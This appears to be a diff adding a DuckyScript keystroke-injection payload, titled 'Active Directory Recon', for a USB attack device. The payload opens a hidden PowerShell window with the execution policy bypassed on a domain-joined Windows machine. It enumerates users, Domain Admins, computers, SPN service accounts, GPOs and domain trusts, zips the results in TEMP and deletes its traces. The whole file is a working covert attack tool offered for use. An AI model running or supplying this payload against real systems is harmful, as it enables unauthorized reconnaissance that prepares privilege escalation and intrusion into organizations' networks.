@@ -1,0 +1,96 @@
+REM =============================================
+REM Title: Active Directory Recon
+REM Author: bad-antics
+REM Description: Domain enumeration without tools
+REM Category: nullsec/recon
+REM Target: Windows (Domain-joined)
+REM =============================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 800
+
+REM Create output directory
+STRING $d="$env:TEMP\adrecon";mkdir $d -Force|Out-Null
+ENTER
+DELAY 200
+
+REM Get domain info
+STRING [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()|Out-File "$d\domain_info.txt"
+ENTER
+DELAY 300
+
+REM Get forest info
+STRING [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()|Out-File "$d\forest_info.txt"
+ENTER
+DELAY 300
+
+REM Get domain controllers
+STRING [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers|Out-File "$d\domain_controllers.txt"
+ENTER
+DELAY 300
+
+REM LDAP search for users
+STRING $searcher=New-Object DirectoryServices.DirectorySearcher;$searcher.Filter="(&(objectCategory=person)(objectClass=user))";$searcher.PropertiesToLoad.Add("samaccountname");$searcher.PropertiesToLoad.Add("mail");$searcher.PropertiesToLoad.Add("memberof");$users=$searcher.FindAll()
+ENTER
+DELAY 500
+
+STRING $users|%{$_.Properties["samaccountname"]}|Out-File "$d\all_users.txt"
+ENTER
+DELAY 300
+
+REM Find Domain Admins
+STRING $searcher.Filter="(&(objectCategory=group)(cn=Domain Admins))";$da=$searcher.FindOne();$da.Properties["member"]|Out-File "$d\domain_admins.txt"
+ENTER
+DELAY 300
+
+REM Find computers
+STRING $searcher.Filter="(objectCategory=computer)";$searcher.PropertiesToLoad.Clear();$searcher.PropertiesToLoad.Add("name");$searcher.PropertiesToLoad.Add("operatingsystem");$comps=$searcher.FindAll()
+ENTER
+DELAY 500
+
+STRING $comps|%{"$($_.Properties['name']) - $($_.Properties['operatingsystem'])"}|Out-File "$d\computers.txt"
+ENTER
+DELAY 300
+
+REM Find service accounts (SPNs)
+STRING $searcher.Filter="(servicePrincipalName=*)";$spns=$searcher.FindAll();$spns|%{$_.Properties["samaccountname"],$_.Properties["serviceprincipalname"]-join"`t"}|Out-File "$d\spn_accounts.txt"
+ENTER
+DELAY 300
+
+REM Get Group Policy Objects
+STRING Get-GPO -All 2>$null|Select DisplayName,GpoStatus,CreationTime|Out-File "$d\gpo_list.txt"
+ENTER
+DELAY 300
+
+REM Get trust relationships
+STRING [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetAllTrustRelationships()|Out-File "$d\trusts.txt"
+ENTER
+DELAY 300
+
+REM Net commands backup
+STRING net user /domain 2>$null|Out-File "$d\net_users.txt"
+ENTER
+DELAY 200
+
+STRING net group /domain 2>$null|Out-File "$d\net_groups.txt"
+ENTER
+DELAY 200
+
+STRING net group "Domain Admins" /domain 2>$null|Out-File "$d\net_domain_admins.txt"
+ENTER
+DELAY 200
+
+REM Compress
+STRING Compress-Archive -Path $d -DestinationPath "$env:TEMP\adrecon_$(hostname).zip" -Force
+ENTER
+DELAY 400
+
+STRING Remove-Item $d -Recurse -Force
+ENTER
+
+STRING exit
+ENTER
